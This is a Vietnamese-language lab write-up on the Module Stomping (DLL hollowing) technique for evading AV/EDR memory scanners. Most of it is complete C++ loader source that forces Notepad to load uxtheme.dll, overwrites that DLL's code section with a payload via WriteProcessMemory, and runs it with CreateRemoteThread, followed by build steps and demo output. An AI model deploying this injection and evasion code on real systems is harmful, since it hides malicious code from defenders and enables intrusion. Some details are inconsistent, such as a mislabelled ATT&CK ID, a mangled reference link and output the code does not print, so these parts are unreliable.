
---

# 📝 [PE 16] Module Stomping (Hiding in Plain Sight)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Module Stomping** (còn được gọi dưới các thuật ngữ học thuật như *Module Overwriting* hoặc *DLL Hollowing*) đại diện cho một giải thuật né tránh phòng thủ động (Dynamic Evasion) cấp độ cao, tập trung đánh lừa các bộ lọc rà quét cấu trúc thuộc tính trang nhớ (**Memory Anti-Forensics / Memory Scanner Evasion**) của các giải pháp AV/EDR hiện đại.

Khi phân hệ phân tích bộ nhớ ảo của EDR kích hoạt cơ chế tuần tra (Memory Hunting/YARA Scanning), các cảm biến an ninh luôn ưu tiên sàng lọc và cô lập các trang bộ nhớ vô danh (Unbacked Memory Pages – cụ thể là các trang nhớ thuộc loại dữ liệu **`MEM_PRIVATE`** mang đặc quyền thực thi). Sự tồn tại của một phân vùng thực thi không liên kết với bất kỳ tệp tin vật lý nào trên đĩa cứng là một chỉ dấu độc hại tối cao (Anomalous Memory Indicators).

Dự án PE 16 hóa giải triệt để điểm thắt nút trinh sát này bằng chiến thuật **Hợp pháp hóa thuộc tính trang nhớ Image (Image-Backed Metamorphism)**. Loader cưỡng bách tiến trình vỏ bọc nạp một tệp thư viện liên kết động hợp pháp được ký số bởi Microsoft từ hệ thống (văn cảnh thực nghiệm: `uxtheme.dll`).

Sau khi mô-đun này được ánh xạ hoàn chỉnh lên RAM dưới dạng một phân vùng Image hợp lệ (**`MEM_IMAGE`**), Loader áp dụng quyền năng can thiệp bộ nhớ chéo tiến trình để **ghi đè trực tiếp mã máy Payload vào phân đoạn mã thực thi của chính DLL đó**. Dòng chảy CPU sẽ kích nổ Payload của ta lọt lòng bên trong một Module đáng tin cậy, che giấu hoàn hảo Call Stack và bẻ gãy hoàn toàn các bộ quét Memory Scanner.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cơ chế Unbacked Memory Scan**: Triệt tiêu hoàn toàn sự xuất hiện của các phân vùng `MEM_PRIVATE` mang cờ thực thi, hợp pháp hóa mã máy dưới dạng thuộc tính `MEM_IMAGE`.
* **Làm chủ giải thuật Thao túng Module Từ xa**: Nghiên cứu quy trình ép nạp và trích xuất cấu trúc định vị Base Address của một DLL hệ thống chéo biên giới RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi trình nạp PE Loader của hệ điều hành ánh xạ một tệp tin DLL vào bộ nhớ ảo của tiến trình, Windows Memory Manager sẽ quy định thuộc tính quản lý của phân vùng RAM đó là **`MEM_IMAGE`**. Đây là phân vùng đại diện cho các tệp nhị phân hợp pháp, có điểm tựa ánh xạ gốc từ đĩa cứng lên không gian ảo (File-Backed Memory Mapping).

Quy trình toán học giải phẫu và thực hiện hành vi giẫm đạp cấu trúc Image của Lab PE 16 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:

```
[Mở Handle] ──> [Ép Notepad nạp uxtheme.dll xịn qua LoadLibraryW từ xa]
                     └──> [CreateToolhelp32Snapshot: Săn lùng địa chỉ Module Base]
                               └──> [WriteProcessMemory: Giẫm đạp mã máy Payload đè bẹp phân đoạn .text]

```

1. **Ép nạp mô-đun Image hợp pháp làm bia đỡ đạn**: Loader tiến hành bơm chuỗi đường dẫn tệp tin của một DLL hệ thống có chữ ký số của Microsoft (văn cảnh cấu trúc: `C:\Windows\System32\uxtheme.dll`) sang RAM tiến trình đích, sau đó khởi tạo một luồng thực thi phụ từ xa ép mục tiêu triệu hồi API `LoadLibraryW`. DLL hợp pháp này được nạp lên bộ nhớ ảo với đầy đủ tư cách pháp nhân, chiếm một vùng nhớ loại **`MEM_IMAGE`** mang cờ bảo vệ mặc định là `PAGE_EXECUTE_READ` (RX).
2. **Định vị tọa độ giẫm đạp cấu trúc**: Loader sử dụng danh bạ bóc tách cấu trúc mô-đun từ xa `CreateToolhelp32Snapshot` (`TH32CS_SNAPMODULE`), duyệt qua các bản ghi để trích xuất chính xác địa chỉ Base Address sống của `uxtheme.dll` trên RAM đối phương. Tọa độ mục tiêu cần giẫm đạp được tịnh tiến an toàn vượt qua phân đoạn PE Headers (mặc định nhảy qua $4\text{ KB}$ để đâm thẳng vào phân đoạn thực thi **`.text`** nguyên bản của DLL):

$$\text{StompTargetAddress} = \text{RemoteModuleBase} + 0x1000$$


3. **Khai hỏa giẫm đạp hành vi (WPM Stomping Magic)**: Loader triệu hồi hàm API `WriteProcessMemory` trỏ thẳng vào vị trí `StompTargetAddress`. Tại đây, Kernel Windows kích hoạt cơ chế lật cờ trang nhớ ngầm của hệ điều hành (Copy-on-Write / Page Protection Toggle), chuyển thuộc tính phân vùng sang `RWX` tạm thời để ghi đè khối mã máy Payload lên, xóa sổ hoàn toàn các byte mã máy gốc của `uxtheme.dll`, rồi tự động hoàn trả lại cờ `RX` ban đầu ngay sau khi tác vụ kết thúc, hợp thức hóa Module che giấu hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa tìm kiếm PID tiến trình, định vị Module chéo RAM và tính toán Offset địa chỉ sống động kịch trần bảo mật hệ thống.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh logic thực thi mở máy tính chéo tiến trình
DWORD WINAPI StompedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Hãm luồng ký sinh để duy trì trạng thái an toàn, bảo toàn tính ổn định cho tiến trình Host
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu cấu trúc RAM tìm Base Address của Module cụ thể lọt lòng tiến trình đích
PVOID GetRemoteModuleBase(DWORD pid, const std::wstring& moduleName) {
    PVOID baseAddress = NULL;   MODULEENTRY32W me32;   me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, moduleName.c_str()) == 0) {
                baseAddress = (PVOID)me32.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);   return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 16: MODULE STOMPING INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // ─── BƯỚC 1: ÉP TIẾN TRÌNH ĐÍCH NẠP MỘT DLL HỢP PHÁP LÀM BIA ĐỠ ĐẠN ───
    std::wstring dllToLoad = L"C:\\Windows\\System32\\uxtheme.dll"; // Sử dụng Signed DLL xịn của OS
    SIZE_T pathSize = (dllToLoad.length() + 1) * sizeof(wchar_t);

    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePathBuffer, dllToLoad.c_str(), pathSize, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    std::cout << "[*] Dang ep Notepad nap module uxtheme.dll xin..." << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);
    if (hLoadThread) {
        WaitForSingleObject(hLoadThread, INFINITE);
        CloseHandle(hLoadThread);
    }
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE); // Dọn dẹp phân vùng chuỗi đường dẫn thô

    // ─── BƯỚC 2: TRÍCH XUẤT TỌA ĐỘ BASE ADDRESS CỦA MODULE VỪA NẠP CHÉO RAM ───
    PVOID remoteModuleBase = GetRemoteModuleBase(pid, L"uxtheme.dll");
    if (!remoteModuleBase) {
        std::cerr << "[-] Khong the thiet lap va dinh vi Module muc tieu!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] San trung Module Base cua uxtheme.dll tai RAM doi phuong: 0x" << std::hex << remoteModuleBase << std::endl;

    // Tính toán tịnh tiến offset an toàn nhảy qua PE Header (nhảy vào entry phân đoạn mã máy thực thi .text)
    PVOID stompTargetAddress = (PVOID)((DWORD_PTR)remoteModuleBase + 0x1000); 
    std::cout << "[+] Toa do hoc xac dinh de thuc hien giam dap (Stomp): 0x" << std::hex << stompTargetAddress << std::endl;

    SIZE_T functionSize = 500;
    // Cấp phát riêng một phân vùng nhỏ mang quyền RW thông thường chỉ để chứa dữ liệu cấu trúc dữ liệu bảng tham số
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
    THREAD_DATA localData;
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy dữ liệu cấu trúc tham số tuyệt đối sang RAM Notepad trước
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 3: GIẪM ĐẠP BỘ NHỚ (STOMPING) - GHI ĐÈ PAYLOAD LÊN PHÂN ĐOẠN MODULE HỢP PHÁP ───
    std::cout << "[*] Dang thuc hien hanh vi Giam dap (Stomp) de bep ma may cua ta vao long uxtheme.dll..." << std::endl;
    BOOL isStomped = WriteProcessMemory(hProcess, stompTargetAddress, (LPCVOID)StompedPayload, functionSize, NULL);

    if (!isStomped) {
        std::cerr << "[-] WriteProcessMemory giam dap that bai!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Hanh vi Giam dap hoan tat! Ma may cua ta da nam tron trong Signed Module." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI TRÊN TỌA ĐỘ ĐÃ GIẪM ĐẠP ───
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread xuyen bien gioi de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stompTargetAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Chờ đồng bộ ngắn giải phóng luồng
        std::cout << "[+] Luong Thread giam dap da khoi hoa thanh cong!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi vùng chứa cấu trúc tham số tuyệt đối và dọn dẹp Handle bảo an kịch trần
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] Module Stomping Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file thực thi Loader vận hành phẳng sạch, mượt mà và độc lập khi phân phối sang các môi trường máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng thông số `Runtime Library`, chuyển cấu hình sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn mã nguồn thư viện CRT vào trong file chạy hệ thống `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án để kiểm chứng ma trận Remap Image:

```powershell
PS C:\Workspace\x64\Release> .\PE16_Module_Stomping.exe
====================================================
[*] PE 16: MODULE STOMPING INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 11048
[*] Dang ep Notepad nap module uxtheme.dll xin...
[+] San trung Module Base cua uxtheme.dll tai RAM doi phuong: 0x00007ffca38b0000
[+] Toa do hoc xac dinh de thuc hien giam dap (Stomp): 0x00007ffca38b1000
[+] Ghi ma may vao phan vung ky sinh hoan tot.
[*] Dang thuc hien Giam dap (Stomp) de bep ma may cua ta vao long uxtheme.dll...
[+] Hanh vi Giam dap hoan tat! Ma may cua ta da nam tron trong Signed Module.
[*] Dang khoi tao luong CreateRemoteThread xuyen bien gioi de kich no...
[+] Luong Thread giam dap da khoi hoa thanh cong!

[+] Module Stomping Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm Giẫm đạp mô-đun Image:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Thuật toán can thiệp dứt điểm, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch khung kịch nền**!
* Tại thời điểm runtime này, nếu một hệ thống quản lý hoặc bộ quét RAM động nâng cao thực hiện kiểm tra kiểm tra Call Stack Integrity của luồng đang chạy, hệ thống phòng thủ sẽ ghi nhận điểm thực thi nằm hoàn toàn bên trong phân vùng không gian địa chỉ hợp pháp mang thuộc tính **`MEM_IMAGE`** của `uxtheme.dll`. Do đây là mô-đun hợp pháp được ký số chứng chỉ bởi Microsoft, Payload hoàn toàn vượt qua vòng thẩm định an toàn của cơ chế Heuristic memory scan một cách tuyệt đối, triệt tiêu 100% cảnh báo mập mờ của các trang nhớ vô danh!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Developer Network**: *Dynamic-Link Library (DLL) Resources & LoadLibraryW Registry* - [https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-loadlibraryapi-loadlibraryw](https://www.google.com/search?q=https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-loadlibraryapi-loadlibraryw)
* **Windows Memory Forensics**: *Detecting Module Stomping and Shellcode Injection in MEM_IMAGE Memory Regions* - SANS Institute Reading Room.
* **Wal3 (Security Architecture)**: *Advanced DLL Injection: Module Stomping / Overwriting via Remote Page Invalidation*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Software Packing / Module Modification (T1055.001)*.

---
